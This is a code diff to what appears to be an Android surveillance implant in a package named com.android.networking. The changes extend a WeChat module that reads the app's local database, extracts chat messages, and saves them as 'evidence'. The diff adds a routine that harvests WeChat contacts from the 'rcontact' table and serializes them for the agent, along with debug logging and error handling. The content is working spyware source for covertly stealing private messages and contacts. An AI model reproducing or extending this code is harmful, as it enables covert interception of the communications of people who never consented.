@@ -27,6 +27,7 @@ import com.android.networking.auto.Cfg;
 import com.android.networking.db.GenericSqliteHelper;
 import com.android.networking.db.RecordVisitor;
 import com.android.networking.file.Path;
+import com.android.networking.manager.ManagerModule;
 import com.android.networking.module.ModuleAddressBook;
 import com.android.networking.util.Check;
 import com.android.networking.util.StringUtils;
@@ -157,6 +158,10 @@ public class ChatWeChat extends SubModuleChat {
 				setMyAccount(helper);
 				ChatGroups groups = getChatGroups(helper);
 
+				if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
+					saveWechatContacts(helper);
+				}
+
 				long newLastLine = fetchMessages(helper, groups, lastLine);
 
 				helper.deleteDb();
@@ -179,7 +184,12 @@ public class ChatWeChat extends SubModuleChat {
 					Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
 				}
 			}
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (readChatWeChatMessages) Error: ", ex);
+			}
 		} finally {
+
 			readChatSemaphore.release();
 		}
 	}
@@ -222,7 +232,7 @@ public class ChatWeChat extends SubModuleChat {
 						from_name = groups.getName(from_id);
 						to = groups.getGroupToName(from_name, talker);
 						to_id = groups.getGroupToId(from_name, talker);
-						
+
 						content = StringUtils.join(lines, "", 1);
 					} else {
 						from_name = myName;
@@ -237,7 +247,10 @@ public class ChatWeChat extends SubModuleChat {
 					to_id = incoming ? myId : talker;
 				}
 
-				MessageChat message = new MessageChat(PROGRAM, date, from_name, from_id, to, to_id, content, incoming);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (cursor) %s -> %s", from_id, to_id);
+				}
+				MessageChat message = new MessageChat(PROGRAM, date, from_id, from_name, to_id, to, content, incoming);
 				messages.add(message);
 
 				return createTime;
@@ -248,6 +261,38 @@ public class ChatWeChat extends SubModuleChat {
 		getModule().saveEvidence(messages);
 
 		return lastCreationLine;
+	}
+
+	private void saveWechatContacts(GenericSqliteHelper helper) {
+		String[] projection = new String[] { "username", "nickname" };
+
+		boolean tosave = false;
+		RecordVisitor visitor = new RecordVisitor(projection, "nickname not null ") {
+
+			@Override
+			public long cursor(Cursor cursor) {
+
+				String username = cursor.getString(0);
+				String nick = cursor.getString(1);
+
+				Contact c = new Contact(username, "", username, "Display name: " + username);
+
+				if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.WECHAT, c)) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (cursor) need to serialize");
+					}
+					return 1;
+				}
+				return 0;
+			}
+		};
+
+		if (helper.traverseRecords("rcontact", visitor) == 1) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (saveWeChatContacts) serialize");
+			}
+			ModuleAddressBook.getInstance().serializeContacts();
+		}
 	}
 
 	private void setMyAccount(GenericSqliteHelper helper) {
